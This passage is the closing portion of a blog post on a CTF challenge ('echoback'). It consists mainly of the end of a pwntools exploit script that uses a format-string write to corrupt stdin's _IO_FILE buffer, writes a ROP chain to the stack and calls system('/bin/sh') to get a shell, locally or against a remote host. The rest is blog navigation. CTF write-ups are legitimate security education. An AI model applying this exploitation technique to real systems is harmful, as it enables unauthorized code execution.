    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> p64<span class="token punctuation">(</span>_IO_buf_base<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token string">'%16$hhn'</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#build payload to modify _IO_2_1_stdin struct</span>
    p <span class="token operator">=</span> p64<span class="token punctuation">(</span>_IO_2_1_stdin_ <span class="token operator">+</span> <span class="token number">0x83</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_ret <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#length:</span>
    sl<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#call getchar() make fp->_IO_read_ptr == fp->_IO_read_end</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#build rop chail</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#length:</span>
    sl<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#db()</span>

    <span class="token comment" spellcheck="true">#get shell</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true">#io = exe.process()</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span> <span class="token punctuation">:</span> libFile<span class="token punctuation">}</span><span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteIp<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>

    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">i0gan</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://blog.i0gan.cn/2020/04/04/wp-echoback/">http://blog.i0gan.cn/2020/04/04/wp-echoback/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a></div><div class="post_share"><div class="social-share" data-image="/img/text_bg.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/04/05/setup-hexo-blog/"><img class="prev-cover" src="/img/text_bg.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">搭建hexo个人博客</div></div></a></div><div class="next-post pull-right"><a href="/2020/04/03/install-arch-linux-and-config/"><img class="next-cover" src="/img/text_bg.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Install archlinux and configure</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2020/11/08/tiesan-2020/" title="tiesan-2020"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-08</div><div class="title">tiesan-2020</div></div></a></div><div><a href="/2020/09/02/wp-2020-ciscn/" title="wp 2020国赛"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-02</div><div class="title">wp 2020国赛</div></div></a></div><div><a href="/2020/09/16/wp-2020-qwb-easypwn/" title="wp 2020强网杯 easypwn"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-16</div><div class="title">wp 2020强网杯 easypwn</div></div></a></div><div><a href="/2020/09/01/wp-2020-qwb/" title="wp 2020强网杯"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-01</div><div class="title">wp 2020强网杯</div></div></a></div><div><a href="/2020/09/15/wp-babydriver/" title="wp baby driver"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-15</div><div class="title">wp baby driver</div></div></a></div><div><a href="/2020/04/14/wp-babyheap/" title="wp babyheap"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-04-14</div><div class="title">wp babyheap</div></div></a></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/header.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">i0gan</div><div class="author-info__description">Even if a man has reached the top, he still needs to improve himself</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">60</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">19</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">13</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#echoback"><span class="toc-number">1.</span> <span class="toc-text">echoback</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec"><span class="toc-number">1.0.1.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vul"><span class="toc-number">1.0.2.</span> <span class="toc-text">vul</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.0.3.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E6%BC%8Flibc%E5%9F%BA%E5%9D%80"><span class="toc-number">1.0.4.</span> <span class="toc-text">泄漏libc基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E6%BC%8Felf%E5%9F%BA%E5%9D%80"><span class="toc-number">1.0.5.</span> <span class="toc-text">泄漏elf基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E6%BC%8F%E5%A0%86%E6%A0%88%E4%B8%ADmain-ret%E5%9C%B0%E5%9D%80"><span class="toc-number">1.0.6.</span> <span class="toc-text">泄漏堆栈中main ret地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9-IO-FILE%E5%B0%86%E6%95%B0%E6%8D%AE%E6%89%93%E5%85%A5stack"><span class="toc-number">1.0.7.</span> <span class="toc-text">修改_IO_FILE将数据打入stack</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-FILE-struct"><span class="toc-number">1.0.7.1.</span> <span class="toc-text">_IO_FILE struct</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-new-file-underflow"><span class="toc-number">1.0.7.2.</span> <span class="toc-text">_IO_new_file_underflow</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.0.7.3.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0rop%E9%93%BE"><span class="toc-number">1.0.8.</span> <span class="toc-text">构造rop链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell"><span class="toc-number">1.0.9.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="toc-number">1.0.10.</span> <span class="toc-text">完整exp</span></a></li></ol></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2020/11/13/cve-2018-18708/" title="CVE-2018-18708"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2018-18708"/></a><div class="content"><a class="title" href="/2020/11/13/cve-2018-18708/" title="CVE-2018-18708">CVE-2018-18708</a><time datetime="2020-11-12T16:33:51.000Z" title="Created 2020-11-13 00:33:51">2020-11-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/11/13/wp-shanghai-syber-2020/" title="第六届上海大学生网络安全大赛 wp"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第六届上海大学生网络安全大赛 wp"/></a><div class="content"><a class="title" href="/2020/11/13/wp-shanghai-syber-2020/" title="第六届上海大学生网络安全大赛 wp">第六届上海大学生网络安全大赛 wp</a><time datetime="2020-11-12T16:33:51.000Z" title="Created 2020-11-13 00:33:51">2020-11-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/11/12/i3-desktop/" title="i3-desktop"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="i3-desktop"/></a><div class="content"><a class="title" href="/2020/11/12/i3-desktop/" title="i3-desktop">i3-desktop</a><time datetime="2020-11-12T12:33:51.000Z" title="Created 2020-11-12 20:33:51">2020-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/11/12/thread-security/" title="thread-security"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="thread-security"/></a><div class="content"><a class="title" href="/2020/11/12/thread-security/" title="thread-security">thread-security</a><time datetime="2020-11-12T12:13:26.000Z" title="Created 2020-11-12 20:13:26">2020-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/11/08/tiesan-2020/" title="tiesan-2020"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="tiesan-2020"/></a><div class="content"><a class="title" href="/2020/11/08/tiesan-2020/" title="tiesan-2020">tiesan-2020</a><time datetime="2020-11-08T14:04:48.000Z" title="Created 2020-11-08 22:04:48">2020-11-08</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/text_bg.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 By i0gan</div><div class="framework-info"></div><div class="icp"><a target="_blank" rel="noopener" href="http://www.beian.gov.cn/"><img class="icp-icon" src="/img/icp.png" alt="ICP"/><span>黔ICP备20006037号</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>